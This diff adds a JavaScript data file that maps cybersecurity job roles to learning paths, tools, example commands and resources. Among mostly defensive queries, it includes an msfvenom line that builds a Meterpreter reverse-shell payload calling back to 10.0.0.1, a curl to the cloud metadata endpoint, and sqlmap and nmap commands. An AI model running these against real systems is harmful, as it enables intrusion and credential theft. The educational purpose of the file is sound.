@@ -1,0 +1,609 @@
+/* data_cybersecurity_galaxy.js
+   Cybersecurity Galaxy — Job Roles & Learning Paths (extensive seed)
+   - Structured for D3 tree (name, short, level, learning[], tools[], commands[], resources[])
+   - Credit: Developed by SACHIDAX
+   - Use as: CYBERSECURITY_GALAXY_DATA
+*/
+
+const CYBERSECURITY_GALAXY_DATA = {
+  meta: {
+    title: "Cybersecurity Galaxy — Job Roles & Learning Paths",
+    description: "Comprehensive job-role centric learning map: sequenced learning steps, tools, commands and curated resources. Developed by SACHIDAX.",
+    author: "SACHIDAX",
+    license: "MIT",
+    generated_at: (new Date()).toISOString()
+  },
+
+  name: "Cybersecurity Galaxy — Roles & Learning Paths",
+  short: "Job roles mapped to sequenced learning paths, tools, commands and resources (Beginner → Advanced)",
+  level: "All",
+  children: [
+
+    /* =========================
+       1. SOC Family (L1 → L3)
+       ========================= */
+    {
+      name: "SOC — Security Operations Center",
+      short: "Operational monitoring, triage, hunting and response (Hinglish-ready: SOC mein alert se expert hunting tak)",
+      level: "All",
+      children: [
+        {
+          name: "SOC L1 — Analyst",
+          short: "Alert triage, basic log analysis, escalate appropriately. (Hinglish: alerts dekh ke escalate karna)",
+          level: "Beginner",
+          learning: [
+            "Understand major log sources: Windows Event Logs, Linux syslog, firewall logs, proxy logs.",
+            "Learn SIEM fundamentals: searching, saved searches, dashboards, basic correlation rules.",
+            "Incident ticketing workflow: triage, enrichment, escalation criteria.",
+            "Basic network fundamentals: TCP/IP, ports, common protocols and how they appear in logs.",
+            "Intro to common malware indicators (suspicious hashes, domains) and safe query enrichment."
+          ],
+          tools: [
+            {name:"Splunk (Search)", why:"Log search and dashboards"},
+            {name:"Elastic Stack (ELK)", why:"Open-source logging and analysis"},
+            {name:"OSQuery", why:"Endpoint live queries"},
+            {name:"Basic Sysinternals", why:"Windows troubleshooting utilities"}
+          ],
+          commands: [
+            "Splunk: index=main sourcetype=WinEventLog | stats count by EventCode",
+            "osquery: SELECT name, pid, path FROM processes WHERE name LIKE '%powershell%';",
+            "grep/syslog example: sudo grep 'Failed password' /var/log/auth.log | tail -n 50"
+          ],
+          resources: [
+            {title:"TryHackMe — Complete Beginner Path", url:"https://tryhackme.com/paths/outline/complete-cyber-security"},
+            {title:"Splunk Education", url:"https://www.splunk.com/en_us/training.html"},
+            {title:"CompTIA Security+", url:"https://www.comptia.org/certifications/security"}
+          ]
+        },
+
+        {
+          name: "SOC L2 — Analyst / Investigator",
+          short: "Deep investigations, host & memory triage, enrichment and containment suggestions. (Hinglish: analysis aur forensics ka basic)",
+          level: "Intermediate",
+          learning: [
+            "Memory-forensics basics: acquisition, volatile data analysis, identifying suspicious process artifacts.",
+            "PCAP and network flow analysis: Zeek, tcpdump, Wireshark fundamentals and typical attack signatures.",
+            "Host-based artifact triage: logs, scheduled tasks, autoruns, persistence mechanisms.",
+            "Threat intel enrichment: using public sources (VirusTotal, AbuseIPDB, MISP) to add context.",
+            "Containment recommendations and creating reproducible investigation artifacts."
+          ],
+          tools: [
+            {name:"Volatility", why:"Memory analysis"},
+            {name:"Wireshark / tcpdump", why:"Network capture analysis"},
+            {name:"Zeek (Bro)", why:"Network monitoring and scriptable detection"},
+            {name:"MISP", why:"Operational threat intelligence platform"}
+          ],
+          commands: [
+            "tcpdump: tcpdump -n -r capture.pcap -vv",
+            "volatility: volatility -f mem.dmp windows.pslist",
+            "wireshark: open capture.pcap and apply display filter 'http.request or dns' for quick triage"
+          ],
+          resources: [
+            {title:"Volatility Foundation", url:"https://www.volatilityfoundation.org/"},
+            {title:"Zeek (Bro) Documentation", url:"https://docs.zeek.org/en/current/"},
+            {title:"TryHackMe — Blue Team Path", url:"https://tryhackme.com/paths/outline/blue-team"}
+          ]
+        },
+
+        {
+          name: "SOC L3 — Threat Hunter / Senior Analyst",
+          short: "Proactive hunting, detection engineering and adversary modeling (Hinglish: proactive hunting aur detection banana).",
+          level: "Advanced",
+          learning: [
+            "Hunting methodology (hypothesis formation, detection query formulation, validation pipelines).",
+            "Detection engineering: writing efficient SIEM queries, developing analytics content and playbooks.",
+            "Threat modeling & mapping to MITRE ATT&CK; creating detection coverage matrices.",
+            "Advanced memory and disk forensic deep-dive and custom artifact development (YARA, Sigma).",
+            "Automation of enrichment and playbook-driven response."
+          ],
+          tools: [
+            {name:"Elastic SIEM / Splunk Enterprise", why:"Analytics at scale"},
+            {name:"YARA", why:"File and pattern detection"},
+            {name:"Sigma rules", why:"Portable detection standard"},
+            {name:"MITRE ATT&CK Navigator", why:"TTP mapping"}
+          ],
+          commands: [
+            "yara -r rules.yar sample.bin",
+            "Elastic query (KQL): process.name: 'cmd.exe' and process.args: '*'"
+          ],
+          resources: [
+            {title:"MITRE ATT&CK", url:"https://attack.mitre.org/"},
+            {title:"SANS Courses (Hunt/IR)", url:"https://www.sans.org/"},
+            {title:"Elastic Security", url:"https://www.elastic.co/solutions/security"}
+          ]
+        }
+      ]
+    },
+
+    /* ==================================
+       2. Offensive / Red Team Family
+       ================================== */
+    {
+      name: "Red Team • Offensive Security",
+      short: "Authorized offensive testing, exploit development, adversary emulation (Hinglish: vulnerabilities dhoondhna aur exploit karna).",
+      level: "Intermediate → Advanced",
+      children: [
+
+        {
+          name: "Penetration Tester — Web & Infrastructure",
+          short: "Authorized tests to discover vulnerabilities in web apps and infrastructure; produce remediation reports.",
+          level: "Intermediate",
+          learning: [
+            "Master OWASP Top 10 and manual web testing techniques (parameter tampering, auth bypass, SSRF, RCE).",
+            "Scanning & enumeration: nmap, masscan, service fingerprinting and versioning.",
+            "Exploit validation, responsible disclosure, and professional reporting.",
+            "Basics of privilege escalation and pivoting to reach higher-value assets.",
+            "Continuous skill building with labs/CTFs and bug bounty platforms."
+          ],
+          tools: [
+            {name:"Burp Suite Professional", why:"Web testing and automation"},
+            {name:"nmap", why:"Host/port/service discovery"},
+            {name:"sqlmap", why:"Automated SQL injection"},
+            {name:"ffuf / dirb", why:"Content discovery"}
+          ],
+          commands: [
+            "nmap -sC -sV -oA target 10.10.10.5",
+            "sqlmap -u 'http://target/?id=1' --batch --threads=5",
+            "ffuf -u http://target/FUZZ -w common.txt -mc 200"
+          ],
+          resources: [
+            {title:"Offensive Security — OSCP", url:"https://www.offsec.com/courses/pen-200/"},
+            {title:"PortSwigger Academy (Burp)", url:"https://portswigger.net/web-security"},
+            {title:"OWASP Top 10", url:"https://owasp.org/www-project-top-ten/"}
+          ]
+        },
+
+        {
+          name: "Exploit Developer / Binary Exploitation",
+          short: "Deep understanding of memory, exploitation techniques, and exploit development.",
+          level: "Advanced",
+          learning: [
+            "Study assembly (x86/x64), calling conventions, and memory layout (stack/heap).",
+            "Master debugging with GDB and pwndbg; develop ROP chains and bypass mitigations.",
+            "Practice on CTF pwn challenges and real-world vulnerability analysis.",
+            "Learn kernel exploitation, fuzzing methodologies, and automated exploit generation."
+          ],
+          tools: [
+            {name:"GDB + pwndbg", why:"Debugger and exploitation helpers"},
+            {name:"pwntools", why:"Exploit scripting"},
+            {name:"radare2 / Ghidra", why:"Reverse-engineering and binary analysis"},
+            {name:"AFL / libFuzzer", why:"Fuzzing engines"}
+          ],
+          commands: [
+            "gdb -q ./vuln",
+            "python3 - <<<'from pwn import *; p=process(\\\"./vuln\\\")'"
+          ],
+          resources: [
+            {title:"pwn.college / CTF writeups", url:"https://pwn.college/"},
+            {title:"Ghidra", url:"https://ghidra-sre.org/"},
+            {title:"pwntools", url:"https://docs.pwntools.com/"}
+          ]
+        },
+
+        {
+          name: "Red Team Operator — C2 & OPSEC",
+          short: "Full-scope adversary emulation including planning, covert communications, persistence, and lateral movement.",
+          level: "Advanced",
+          learning: [
+            "Operational planning and rules of engagement, OPSEC fundamentals.",
+            "C2 frameworks & covert channel design; beaconing and EDR evasion techniques.",
+            "Data exfiltration strategies, lateral movement, and cleanup.",
+            "Red/Blue collaborative exercises (Purple teaming) and effective reporting."
+          ],
+          tools: [
+            {name:"Cobalt Strike (licensed)", why:"Commercial red team toolkit"},
+            {name:"Empire", why:"Post-exploitation framework"},
+            {name:"BloodHound", why:"AD attack path analysis"}
+          ],
+          commands: [
+            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f exe -o shell.exe"
+          ],
+          resources: [
+            {title:"BloodHound", url:"https://github.com/BloodHoundAD/BloodHound"},
+            {title:"Cobalt Strike", url:"https://www.cobaltstrike.com/ (licensed)"},
+            {title:"Adversary Emulation Plans (MITRE)", url:"https://attack.mitre.org/docs/Adversary_Emulation_Plans.pdf"}
+          ]
+        }
+      ]
+    },
+
+    /* =====================================
+       3. Blue Team • Detection & Response
+       ===================================== */
+    {
+      name: "Blue Team — Detection & Response",
+      short: "Design, implement and operate detection, response, and recovery capabilities.",
+      level: "Intermediate → Advanced",
+      children: [
+
+        {
+          name: "Incident Responder",
+          short: "Contain, eradicate, recover from incidents; build IR playbooks.",
+          level: "Advanced",
+          learning: [
+            "IR lifecycle: preparation, identification, containment, eradication, recovery, lessons learned.",
+            "Memory & disk forensics, timeline building, root-cause analysis.",
+            "Legal and communication aspects during incidents (stakeholder management).",
+            "Advanced case packaging and evidence preservation."
+          ],
+          tools: [
+            {name:"Volatility", why:"Memory forensics"},
+            {name:"Autopsy / Sleuth Kit", why:"Disk-level forensics"},
+            {name:"FTK Imager", why:"Disk imaging"}
+          ],
+          commands: [
+            "fls -r image.dd",
+            "volatility -f mem.raw windows.pslist"
+          ],
+          resources: [
+            {title:"SANS — Incident Response", url:"https://www.sans.org/cyber-security-courses/forensics-incident-response/"},
+            {title:"Autopsy", url:"https://www.sleuthkit.org/autopsy/"}
+          ]
+        },
+
+        {
+          name: "Detection Engineer",
+          short: "Create scalable detections and analytics for SIEM and EDR platforms.",
+          level: "Advanced",
+          learning: [
+            "SIEM query languages and optimization; efficient rule design to reduce false positives.",
+            "Behavioral analytics, anomaly detection, and statistical baselining.",
+            "Instrumentation of telemetry sources and observability best practices.",
+            "Development of automated playbooks for triage and response."
+          ],
+          tools: [
+            {name:"Splunk / Search Processing Language", why:"Search & analytics"},
+            {name:"Elastic (KQL) & Beats", why:"Ingest and search telemetry"},
+            {name:"Sigma", why:"Cross-platform detection rules"}
+          ],
+          commands: [
+            "Splunk: index=security sourcetype=wineventlog EventCode=4624 | stats count by AccountName"
+          ],
+          resources: [
+            {title:"Sigma Rules repository", url:"https://github.com/SigmaHQ/sigma"},
+            {title:"Elastic Security", url:"https://www.elastic.co/solutions/security"}
+          ]
+        }
+      ]
+    },
+
+    /* ===========================
+       4. Cloud Security Family
+       =========================== */
+    {
+      name: "Cloud Security",
+      short: "Secure cloud workloads, IAM, logging, and detect cloud-specific threats.",
+      level: "Intermediate → Advanced",
+      children: [
+        {
+          name: "Cloud Security Engineer",
+          short: "Harden cloud infrastructure, implement least-privilege and logging.",
+          level: "Intermediate",
+          learning: [
+            "IAM fundamentals for AWS/Azure/GCP: roles, policies, service principals, scopes.",
+            "Cloud logging and forensics: CloudTrail, CloudWatch, Azure Monitor, GCP Audit Logs.",
+            "Secure networking in cloud: VPCs, subnets, security groups, peering.",
+            "Implement automation for hardening using IaC and CI/CD checks."
+          ],
+          tools: [
+            {name:"ScoutSuite", why:"Cloud posture assessment"},
+            {name:"Prowler", why:"AWS security best practices checker"},
+            {name:"CloudTrail / Azure Monitor", why:"Logging & audit trails"}
+          ],
+          commands: [
+            "# AWS metadata enumeration (read-only):",
+            "curl http://169.254.169.254/latest/meta-data/"
+          ],
+          resources: [
+            {title:"Pacu (AWS offensive tool)", url:"https://github.com/RhinoSecurityLabs/pacu"},
+            {title:"ScoutSuite", url:"https://github.com/nccgroup/ScoutSuite"}
+          ]
+        },
+
+        {
+          name: "Cloud Penetration Tester",
+          short: "Discover privilege escalation paths and attack chains in cloud environments.",
+          level: "Advanced",
+          learning: [
+            "Attack path methodology for cloud: role chaining, cross-account access, policy misconfigurations.",
+            "Abuse of managed services and overlooked trust boundaries.",
+            "Build reproducible POCs and responsible disclosure for cloud misconfigurations."
+          ],
+          tools: [
+            {name:"Pacu", why:"AWS exploitation toolkit"},
+            {name:"CloudSploit", why:"Cloud misconfiguration scanning"}
+          ],
+          resources: [
+            {title:"Pacu", url:"https://github.com/RhinoSecurityLabs/pacu"},
+            {title:"CloudSploit", url:"https://www.cloudsploit.com/"}
+          ]
+        }
+      ]
+    },
+
+    /* ===========================
+       5. Application Security (AppSec)
+       =========================== */
+    {
+      name: "Application Security • DevSecOps",
+      short: "Secure SDLC, SAST/DAST, CI/CD and runtime protections.",
+      level: "Intermediate → Advanced",
+      children: [
+        {
+          name: "AppSec Engineer",
+          short: "Threat modeling, code review, SAST and DAST integration.",
+          level: "Intermediate",
+          learning: [
+            "Threat modeling frameworks (STRIDE, PASTA).",
+            "Static analysis (SAST) and dynamic analysis (DAST) placement in CI/CD.",
+            "Dependency and supply-chain security (SBOM, SCA tools)."
+          ],
+          tools: [
+            {name:"Snyk", why:"Dependency scanning"},
+            {name:"OWASP ZAP", why:"DAST testing"},
+            {name:"SonarQube", why:"Code quality and static checks"}
+          ],
+          resources: [
+            {title:"OWASP Top 10", url:"https://owasp.org/www-project-top-ten/"},
+            {title:"Snyk Docs", url:"https://snyk.io/docs/"}
+          ]
+        },
+
+        {
+          name: "DevSecOps Engineer",
+          short: "Security-as-code, IaC scanning, container and runtime security.",
+          level: "Intermediate → Advanced",
+          learning: [
+            "Integrate security tooling in CI/CD and review pipelines.",
+            "IaC (Terraform/CloudFormation) scanning and drift detection.",
+            "Container image scanning and runtime policy enforcement."
+          ],
+          tools: [
+            {name:"Trivy", why:"Container & IaC scanning"},
+            {name:"Checkov", why:"IaC scanning"},
+            {name:"Falco / OPA", why:"Runtime security & policy enforcement"}
+          ],
+          resources: [
+            {title:"Trivy", url:"https://github.com/aquasecurity/trivy"},
+            {title:"Checkov", url:"https://www.checkov.io/"}
+          ]
+        }
+      ]
+    },
+
+    /* ===========================
+       6. Forensics & Malware Analysis
+       =========================== */
+    {
+      name: "Forensics & Malware Analysis",
+      short: "Static/dynamic analysis and incident artifact investigation.",
+      level: "Advanced",
+      children: [
+        {
+          name: "Memory Forensics Specialist",
+          short: "Acquire and analyze volatile artifacts for detection/evidence.",
+          level: "Advanced",
+          learning: [
+            "Memory acquisition techniques and anti-forensics considerations.",
+            "Use Volatility plugins to extract process, network, and injected code artifacts.",
+            "Create timelines correlating memory and disk artifacts."
+          ],
+          tools: [
+            {name:"Volatility", why:"Memory analysis"},
+            {name:"Rekall", why:"Memory analysis alternatives"}
+          ],
+          resources: [
+            {title:"Volatility Foundation", url:"https://www.volatilityfoundation.org/"}
+          ]
+        },
+        {
+          name: "Malware Analyst",
+          short: "Reverse-engineering, unpacking, behavioral analysis and sandboxing.",
+          level: "Advanced",
+          learning: [
+            "Static disassembly and code flow comprehension.",
+            "Dynamic analysis in controlled sandboxes and network isolation.",
+            "Custom unpacking and API tracing techniques."
+          ],
+          tools: [
+            {name:"Ghidra", why:"Disassembler and RE suite"},
+            {name:"x64dbg", why:"Windows debugger"},
+            {name:"Cuckoo Sandbox", why:"Automated dynamic analysis"}
+          ],
+          resources: [
+            {title:"Ghidra", url:"https://ghidra-sre.org/"},
+            {title:"Cuckoo Sandbox", url:"https://cuckoosandbox.org/"}
+          ]
+        }
+      ]
+    },
+
+    /* ===========================
+       7. Threat Intelligence & OSINT
+       =========================== */
+    {
+      name: "Threat Intelligence & OSINT",
+      short: "Collect, validate and operationalize threat data and actor TTPs.",
+      level: "Advanced",
+      children: [
+        {
+          name: "Threat Intel Analyst",
+          short: "Map attacker behavior to TTPs, produce usable IOCs and intel reports.",
+          level: "Advanced",
+          learning: [
+            "IOC collection, enrichment and operationalization into detection tooling.",
+            "MITRE ATT&CK mapping and adversary profiling.",
+            "Open-source intelligence (OSINT) techniques for actor attribution."
+          ],
+          tools: [
+            {name:"MISP", why:"IOC platform"},
+            {name:"Maltego", why:"OSINT graphing and relationships"},
+            {name:"Recorded Future (commercial)", why:"Threat feeds"}
+          ],
+          resources: [
+            {title:"MISP Project", url:"https://www.misp-project.org/"},
+            {title:"MITRE ATT&CK", url:"https://attack.mitre.org/"}
+          ]
+        }
+      ]
+    },
+
+    /* ===========================
+       8. GRC / Security Architecture
+       =========================== */
+    {
+      name: "GRC — Governance, Risk & Compliance",
+      short: "Policy, control frameworks and audit-ready compliance.",
+      level: "All",
+      children: [
+        {
+          name: "Security Compliance Analyst",
+          short: "Control mapping, evidence collection and audit assistance.",
+          level: "Intermediate",
+          learning: [
+            "Understand ISO27001 controls, NIST CSF, GDPR basics and compliance mappings.",
+            "Perform control gap assessments and evidence collection."
+          ],
+          resources: [
+            {title:"NIST Cybersecurity Framework", url:"https://www.nist.gov/cyberframework"},
+            {title:"ISO/IEC 27001", url:"https://www.iso.org/isoiec-27001-information-security.html"}
+          ]
+        },
+        {
+          name: "Security Architect",
+          short: "Design secure enterprise architectures and threat-modeled systems.",
+          level: "Advanced",
+          learning: [
+            "Architectural risk assessment, secure design patterns, defensive layering.",
+            "Threat modeling exercises integrated in SDLC."
+          ],
+          resources: [
+            {title:"OWASP ASVS", url:"https://owasp.org/www-project-application-security-verification-standard/"}
+          ]
+        }
+      ]
+    },
+
+    /* ===========================
+       9. Career, Certifications & Paths
+       =========================== */
+    {
+      name: "Career Paths & Certifications",
+      short: "Suggested certifications & career ladders per role",
+      level: "All",
+      children: [
+        {
+          name: "Entry Level • Foundations",
+          short: "A+, Network+, Security+, vendor free learning paths and TryHackMe beginner tracks.",
+          resources: [
+            {title:"CompTIA Security+", url:"https://www.comptia.org/certifications/security"},
+            {title:"TryHackMe — Complete Path", url:"https://tryhackme.com/paths/outline/complete-cyber-security"}
+          ]
+        },
+        {
+          name: "Mid Level • Specialist",
+          short: "OSCP, GCIH, GCIA and specialized SANS/GIAC tracks.",
+          resources: [
+            {title:"OffSec (OSCP)", url:"https://www.offsec.com/courses/pen-200/"},
+            {title:"GIAC / SANS", url:"https://www.giac.org/"}
+          ]
+        },
+        {
+          name: "Senior • Leadership & Architecture",
+          short: "CISSP, CISM, CRTO and architect-level credentials.",
+          resources: [
+            {title:"ISC2 — CISSP", url:"https://www.isc2.org/certifications/cissp"},
+            {title:"ISACA — CISM", url:"https://www.isaca.org/credentialing/cism"}
+          ]
+        }
+      ]
+    },
+
+    /* ===========================
+       10. Practice Platforms & Labs
+       =========================== */
+    {
+      name: "Practice Labs & CTFs",
+      short: "Hands-on platforms to practice both offensive and defensive skills.",
+      level: "All",
+      children: [
+        { name: "TryHackMe", short: "Guided beginner → advanced labs", resources:[{title:"TryHackMe", url:"https://tryhackme.com/"}] },
+        { name: "Hack The Box", short: "Offensive labs & active community", resources:[{title:"Hack The Box", url:"https://www.hackthebox.com/"}] },
+        { name: "VulnHub", short: "Downloadable vulnerable VMs for local practice", resources:[{title:"VulnHub", url:"https://www.vulnhub.com/"}] },
+        { name: "CTFtime", short: "CTF events and team listings", resources:[{title:"CTFtime", url:"https://ctftime.org/"}] }
+      ]
+    },
+
+    /* ===========================
+       11. Tooling Master List
+       =========================== */
+    {
+      name: "Tooling Master List",
+      short: "Quick reference of widely used cybersecurity tools (purpose only).",
+      level: "All",
+      children: [
+        {name:"nmap", short:"Host & port discovery", resources:[{title:"nmap", url:"https://nmap.org/"}]},
+        {name:"Wireshark", short:"Packet capture & analysis", resources:[{title:"Wireshark", url:"https://www.wireshark.org/"}]},
+        {name:"Burp Suite", short:"Web proxy & scanner", resources:[{title:"Burp Suite", url:"https://portswigger.net/burp"}]},
+        {name:"Metasploit", short:"Exploit framework", resources:[{title:"Metasploit", url:"https://www.metasploit.com/"}]},
+        {name:"sqlmap", short:"Automated SQL injection", resources:[{title:"sqlmap", url:"https://sqlmap.org/"}]},
+        {name:"Volatility", short:"Memory forensics", resources:[{title:"Volatility", url:"https://www.volatilityfoundation.org/"}]},
+        {name:"Ghidra", short:"Reverse engineering", resources:[{title:"Ghidra", url:"https://ghidra-sre.org/"}]}
+      ]
+    },
+
+    /* ===========================
+       12. Specialty Roles (IoT, OT, Privacy)
+       =========================== */
+    {
+      name: "Specialty • IoT / OT / Privacy",
+      short: "Sector-specific cybersecurity roles: OT, IoT hardware, privacy & data protection.",
+      level: "Specialized",
+      children: [
+        {
+          name: "OT/ICS Security Engineer",
+          short: "Protect Industrial Control Systems and SCADA environments.",
+          level: "Advanced",
+          learning: [
+            "Understand protocol specifics (Modbus, DNP3, BACnet) and safe testing practices.",
+            "OT network segmentation, monitoring and vendor-specific hardening."
+          ],
+          resources: [
+            {title:"ICS-CERT / CISA resources", url:"https://www.cisa.gov/ics"}
+          ]
+        },
+        {
+          name: "IoT Security Researcher",
+          short: "Firmware analysis, hardware interfaces, and embedded system threats.",
+          level: "Advanced",
+          learning: [
+            "Firmware extraction, JTAG/UART interfaces, hardware debugging.",
+            "Embedded OS internals and secure boot chains."
+          ],
+          tools: [{name:"Binwalk", why:"Firmware analysis"}, {name:"Ghidra", why:"Bin analysis"}],
+          resources: [{title:"Binwalk", url:"https://github.com/ReFirmLabs/binwalk"}]
+        },
+        {
+          name: "Privacy / Data Protection Officer",
+          short: "Policy, compliance and privacy engineering to meet legal requirements.",
+          level: "All",
+          learning: [
+            "GDPR, data lifecycle management, privacy-by-design principles.",
+            "Data inventory, DPIA, and vendor assessments."
+          ],
+          resources: [
+            {title:"EU GDPR Portal", url:"https://gdpr.eu/"},
+            {title:"NIST Privacy Framework", url:"https://www.nist.gov/privacy-framework"}
+          ]
+        }
+      ]
+    }
+
+    /* ========== end of main children ========== */
+  ] // end children
+}; // end CYBERSECURITY_GALAXY_DATA
+
+/* Export (if used as module) */
+if (typeof module !== "undefined" && module.exports) {
+  module.exports = CYBERSECURITY_GALAXY_DATA;
+}
